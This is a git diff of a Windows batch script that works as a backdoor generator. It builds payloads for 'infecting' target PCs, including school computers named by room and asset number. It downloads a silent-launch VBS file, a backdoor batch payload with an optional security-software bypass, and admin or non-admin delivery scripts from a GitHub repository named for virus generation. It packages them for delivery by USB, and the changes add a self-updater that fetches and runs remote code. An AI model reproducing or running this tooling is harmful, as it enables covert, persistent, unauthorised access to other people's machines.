@@ -1,23 +1,27 @@
 :: setup
 :start
 @ECHO OFF
-set update_number=4.41.28
-set dev=0
+< C:\ProgramData\UPnum.sav (
+  set /p update_number=
+)
+set dev=1
 cls
 :VBSDynamicBuild
 SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
 IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
 ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
 ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
-ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
+ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%"
 ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
-set temp=0&set autofullscreen=true&set updatelogs=true&set debug_enabled=false&set antivirus=true&set progress_bar=true&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=false&set EP_install_launched_from_menu=false
+set temp=0&set autofullscreen=true&set updatelogs=true&set debug_enabled=false&set antivirus=true&set progress_bar=true&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=false&set EP_install_launched_from_menu=false&set device_name_advice=true&set auto_gen_name=false
 if not exist C:\ProgramData\autofullscreen.sav echo true>C:\ProgramData\autofullscreen.sav
 if not exist C:\ProgramData\updatelogs.sav echo true>C:\ProgramData\updatelogs.sav
 if not exist C:\ProgramData\debug_enabled.sav echo false>C:\ProgramData\debug_enabled.sav
 if not exist C:\ProgramData\antivirus.sav echo true>C:\ProgramData\antivirus.sav
 if not exist C:\ProgramData\progress_bar.sav echo true>C:\ProgramData\progress_bar.sav
 if not exist C:\ProgramData\target_software_bypass.sav echo true>C:\ProgramData\target_software_bypass.sav
+if not exist C:\ProgramData\device_name_advice.sav echo true>C:\ProgramData\device_name_advice.sav
+if not exist C:\ProgramData\auto_gen_name.sav echo false>C:\ProgramData\auto_gen_name.sav
 title Beta Release %update_number%
 cls
 < C:\ProgramData\autofullscreen.sav (
@@ -38,12 +42,19 @@ cls
 < C:\ProgramData\target_software_bypass.sav (
   set /p target_software_bypass=
 )
+< C:\ProgramData\device_name_advice.sav (
+  set /p device_name_advice=
+)
+< C:\ProgramData\auto_gen_name.sav (
+  set /p auto_gen_name=
+)
 if %autofullscreen% equ true CSCRIPT //nologo "%TempVBSFile%"
 if %username% equ 61481 goto skip_dev
 if %debug_enabled% equ true goto skip_dev
 if %username% neq luken if %dev% equ 1 goto dev
 :skip_dev
-if exist C:\ProgramData\UPnum.sav (call :update_check) else (goto UPcreate)
+if not exist environment_updater.bat (call :downloadenvup)
+if exist "C:\users\%username%\appdata\update_log_flag" (call :update_check)
 :UPnxt
 git version >git.sav
 >nul find "version" git.sav && (
@@ -63,6 +74,7 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
 :EP_finish
 :: manual configuration
   :exit_menu
+  echo [45mversion 5 is being made which will allow for updating the entire program and other new features[0m
   echo [31madmin backdoor needs more testing, use this at your own risk[0m
   echo do you have admin permissions on the target PC?
   echo note: this will require you to have admin rights when infecting A PC, however it will infect all users on that PC, not just the active one.
@@ -70,30 +82,34 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
   echo [33mpress M to be taken to settings[0m
   choice /C YNM /m "does target PC have admin rights? Y/N:
   if %errorlevel% equ 1 (set target_admin_rights=true) else (if %errorlevel% equ 2 (set target_admin_rights=false) else (goto menu))
-  echo.  
+  echo.
+  if %auto_gen_name% equ true goto gen_name
+  if %device_name_advice% equ true (  
   echo it is recomended for school computers to use this format: username_roomID_assetnumber
   echo username is the username of whoever was logged on while infecting
   echo roomID is the room name, expample: BF12
   echo assetnumber can be found on a sticker on the PC you are infecting.
   echo.
   echo for personal devices it is recomended to use ownername_PC/laptop_infectionnumber
-  echo replace ownername with name of device owner, PC/laptop with the device type, and infectionnumber for multiple devices
-  echo DO NOT USE SPACES, replace them with _ or -
+  echo replace ownername with name of device owner, PC/laptop with the device type, and infectionnumber for multiple devices)
+  echo spaces will be replaced with _
   echo.
   set /p opt1=Device name:
+  set opt1=%opt1: =_%
+  :namegennxt
   echo where would you like to create the files
   echo if directory does not exist it will be created
   set /p opt2=directory:
 :: create all files needed
   :: create placeholder file
     Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/progress_bar2.bat").Content >"progress bar.bat"
-    start call "progress bar2.bat"
+    start call "progress bar.bat"
     timeout 1 >nul
-    echo 1>load_trigger.txt
+    echo one>load_trigger.txt
     Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/default_placeholder.bat").Content >temp.txt
     powershell -Command "(gc temp.txt) -replace 'REPver', '%update_number%' | Out-File -encoding ASCII %opt1%.bat"
     del temp.txt
-    echo 2>load_trigger.txt
+    echo two>load_trigger.txt
   :: upload file to github
     echo [33mregistering code on github...[0m
     git config user.name "%username%"
@@ -109,55 +125,53 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
     git push origin main
     echo [92mregistered file on github![0m
   :: generate a file to launch payload from start up folder in invisible mode
-   echo 3>load_trigger.txt
+   echo three>load_trigger.txt
     mkdir %opt2%\payload >nul
-    echo 4>load_trigger.txt
+    echo four>load_trigger.txt
     echo [33mdownloading code from github to create silent launch file...[0m
     Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/SL.vbs").Content >%opt2%\payload\launch.vbs
     if exist %opt2%\payload\launch.vbs (echo [92msuccessfully created silent launch file![0m) else (goto error4)
   :: generate a file to run code from github on the target PC
-    echo 5>load_trigger.txt
+    echo five>load_trigger.txt
     echo [33mdownloading code from github to create backdoor file...[0m
     if %target_software_bypass% equ false Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/BC_software_disabled.bat").Content >%opt2%\payload\payload.bat
     if %target_software_bypass% equ true Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/BC_software_enabled.bat").Content >%opt2%\payload\payload.bat
-    echo 6>load_trigger.txt
+    echo six>load_trigger.txt
     powershell -Command "(gc %opt2%\payload\payload.bat) -replace 'REPtxt', '%opt1%' | Out-File -encoding ASCII %opt2%\payload\payload.bat"
     if exist %opt2%\payload\payload.bat (echo [92msuccessfully created backdoor file![0m) else (goto error6)
   :: generate a file to move files to their proper location
-    echo 7>load_trigger.txt
+    echo seven>load_trigger.txt
     echo [33mdownloading code to deliver backdoor...[0m
     if %target_admin_rights% equ true Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC_yes_admin.bat").Content >%opt2%\run.bat
     if %target_admin_rights% equ false Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC_no_admin.bat").Content >%opt2%\run.bat
     if exist %opt2%\run.bat (echo [92msuccessfully created run file![0m) else (goto error7)
   :: create readme file
-    echo 8>load_trigger.txt
+    echo eight>load_trigger.txt
     echo [33mgenerating readme file...[0m
     echo clicking run will infect whatever PC the files are on, so put these files on a usb and the files will be automaticaly moved to that PC. >%opt2%\readme.txt
     if exist %opt2%\readme.txt echo [92msuccessfully created readme file![0m
   :: check all files where made
     echo [33mverifying all files where successfuly made...[0m
-    echo 9>load_trigger.txt
+    echo nine>load_trigger.txt
     if exist %opt2%\payload\launch.vbs (echo [92msilent launch exists[0m) else (goto error4)
     if exist %opt2%\payload\payload.bat (echo [92mbackdoor exists[0m) else (goto error6)
     if exist %opt2%\run.bat (echo [92mrun exists[0m) else (goto error7)
 :: delete files created during setup
-  echo 10>load_trigger.txt
+  echo ten>load_trigger.txt
   echo [33mcleaning up temp files...[0m
   if exist %opt1%.bat (set temp=1) else (echo [92mno temp files where found[0m)
   if %temp% equ 1 del %opt1%.bat
   if %temp% equ 1 echo [92mtemp files deleted[0m
-  echo 11>load_trigger.txt
+  echo eleven>load_trigger.txt
+powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Backdoor Complete', 'Your backdoor has been completed and placed in %opt1%!', [System.Windows.Forms.ToolTipIcon]::None)}"
 echo.
 echo press any key to exit...
 pause >nul
+echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
 exit /b
 :update_check
-< C:\ProgramData\UPnum.sav (
-  set /p UPnum=
-)
-if %UPnum% equ %update_number% exit /b
+del "C:\users\%username%\appdata\update_log_flag"
 :UPlogs
-echo %update_number% >C:\ProgramData\UPnum.sav
 if %updatelogs% equ false (echo New Update was installed, %update_number%
 exit /b)
 Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Current-update-logs").Content >C:\ProgramData\UPlogs.txt
@@ -201,6 +215,7 @@ exit /b
     echo.
     echo press any key to exit...
     pause >nul
+    echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
     exit /b
   :error4
     git rm %opt1%.bat
@@ -213,6 +228,7 @@ exit /b
     echo.
     echo press any key to exit...
     pause >nul
+    echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
     exit /b
   :error5
     title error code 5
@@ -221,10 +237,11 @@ exit /b
     echo [31merror type: fatal[0m
     echo [31mhow to replicate: unknown.[0m
     echo [31mhow to fix: there is no known fix for this error[0m
-    echo [31mextra information: if you would like to help me fix this bug please contact me through discord: "guest257351#1040" I have no idea why this bug is caused, it is most likely caused because you do not have permission to edit C:\ProgramData[0m
+    echo [31mextra information: if you would like to help me fix this bug please contact me through discord: "guest257351#0001" I have no idea why this bug is caused, it is most likely caused because you do not have permission to edit C:\ProgramData[0m
     echo.
     echo press any key to exit...
     pause >nul
+    echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
     exit /b
   :error6
     git rm %opt1%.bat
@@ -238,6 +255,7 @@ exit /b
     echo.
     echo press any key to exit...
     pause >nul
+    echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
     exit /b
   :error7
     git rm %opt1%.bat
@@ -247,10 +265,11 @@ exit /b
     echo [31merror type: fatal[0m
     echo [31mhow to replicate: unknown[0m
     echo [31mhow to fix: there is no known fix for this error[0m
-    echo [31mextra information: if you would like to help me fix this bug please contact me through discord: guest257351#1040[0m
+    echo [31mextra information: if you would like to help me fix this bug please contact me through discord: guest257351#0001[0m
     echo.
     echo press any key to exit...
     pause >nul
+    echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
     exit /b
   :error8
     echo [31merror code: 08[0m
@@ -258,10 +277,11 @@ exit /b
     echo [31merror type: fatal[0m
     echo [31mhow to replicate: unknown[0m
     echo [31mhow to fix: error is most likely caused by lack of internet connection. Please make sure you are connected and github.com is not blocked on your wifi.[0m
-    echo [31mextra information: if you would like to help me fix this bug please contact me through discord: guest257351#1040[0m
+    echo [31mextra information: if you would like to help me fix this bug please contact me through discord: guest257351#0001[0m
     echo.
     echo press any key to exit...
     pause >nul
+    echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
     exit /b
 :: ask user for email adress
 :emailadd
@@ -285,14 +305,14 @@ goto emailnext
 :dev
 echo.
 title dissabled %update_number%
-echo app dissabled due to development. contact though discord (guest257351#1040) for more information
+echo app dissabled due to development. contact though discord (guest257351#0001) for more information
 echo.
 echo press any key to exit...
 pause >nul
+echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
 exit /b
-:UPcreate
-echo %update_number% >C:\ProgramData\UPnum.sav
-goto UPlogs
+set opt1=%username%_device_%random%%random%
+goto namegennxt
 :backdoor_remove
 echo [31mWARNING![0m
 echo.
@@ -340,6 +360,13 @@ echo [33minstalling git...[0m
 gitDL.exe /silent
 del gitDL.exe
 goto start
+:downloadenvup
+echo version 5 has been released, would you like to upgrade automaticaly now?
+choice
+if %errorlevel% EQU 2 exit /b
+Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/environment_updater.bat").Content >"environment_updater.bat"
+call environment_updater.bat
+exit /b
 :EP_module
 echo.
 echo Hello %username%, you have been granted access to the EP bot module.
@@ -379,13 +406,22 @@ echo [92minstallation completed![0m you can find the program in %EP_dir%.
 echo dat>"C:\users\%username%\EPbot_installed.sav"
 echo.
 echo.
-echo [31mWARNING! [33ma window will have opened to build the textract font database, click continue.
+echo [31mWARNING! [33ma window will have opened to build the textract font database, click continue.[0m
 echo.
 echo press any key to return to the menu...
 pause >nul
 if %EP_install_launched_from_menu% equ true (set EP_install_launched_from_menu=false
 goto menu)
 goto EP_finish
+:force_update
+echo placeholder>"C:\users\%username%\appdata\forceupdate.txt"
+echo.
+echo please relaunch the program to trigger update
+echo.
+echo press any key to exit...
+pause>nul
+echo placeholder>"C:\users\%username%\appdata\exit_true.txt"
+exit /b
 :menu
 cls
 echo.
@@ -399,11 +435,14 @@ echo 3(debug mode (app will not be dissabled when it is broken) (%debug_enabled%
 echo 4(built in antivirus (prevents you from backdooring your own PC) (%antivirus%)
 echo 5(run progress_bar while generating (%progress_bar%) 
 echo 6(legacy mode, old software bypass mode (broken) (%target_software_bypass%)
-echo 7(download free installer (downloads an installer for the free version of the backdoor generator to give to a friend.)
-echo 8(download EP bot
-echo 9(back to main menu
+echo 7(advice on proper device naming (%device_name_advice%)
+echo 8(download free installer (downloads an installer for the free version of the backdoor generator to give to a friend.)
+echo 9(download EP bot
+echo A(automaticaly generate device name, format will be "%username%_device_[random number]" (%auto_gen_name%)
+echo B(force update (need to restart)
+echo C(back to main menu
 echo.
-choice /M "option: " /c 123456789 /n
+choice /M "option: " /c 123456789AB /n
 if %errorlevel% equ 1 goto menu1
 if %errorlevel% equ 2 goto menu2
 if %errorlevel% equ 3 goto menu3
@@ -412,7 +451,10 @@ if %errorlevel% equ 5 goto menu5
 if %errorlevel% equ 6 goto menu6
 if %errorlevel% equ 7 goto menu7
 if %errorlevel% equ 8 goto menu8
-if %errorlevel% equ 9 goto exit_menu
+if %errorlevel% equ 9 goto menu9
+if %errorlevel% equ 10 goto menu10
+if %errorlevel% equ 11 goto exit_menu
+if %errorlevel% equ 12 goto force_update
 :menunxt
 echo %autofullscreen%>C:\ProgramData\autofullscreen.sav
 echo %updatelogs%>C:\ProgramData\updatelogs.sav
@@ -420,6 +462,8 @@ echo %debug_enabled%>C:\ProgramData\debug_enabled.sav
 echo %antivirus%>C:\ProgramData\antivirus.sav
 echo %progress_bar%>C:\ProgramData\progress_bar.sav
 echo %target_software_bypass%>C:\ProgramData\target_software_bypass.sav
+echo %device_name_advice%>C:\ProgramData\device_name_advice.sav
+echo %auto_gen_name%>C:\ProgramData\auto_gen_name.sav
 goto menu
 :menu1
 if %autofullscreen% equ false (set autofullscreen=true
@@ -452,9 +496,19 @@ goto menunxt)
 if %target_software_bypass% equ true set target_software_bypass=false
 goto menunxt
 :menu7
+if %device_name_advice% equ false (set device_name_advice=true
+goto menunxt)
+if %device_name_advice% equ true set device_name_advice=false
+goto menunxt
+:menu8
 set /p free_dir_install=download location:
 Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/free_installer.bat").Content >"%free_dir_install%\free backdoor generator installer.bat"
 goto menunxt
-:menu8
+:menu9
 set EP_install_launched_from_menu=true
 goto menu_install
+:menu10
+if %auto_gen_name% equ false (set auto_gen_name=true
+goto menunxt)
+if %auto_gen_name% equ true set auto_gen_name=false
+goto menunxt
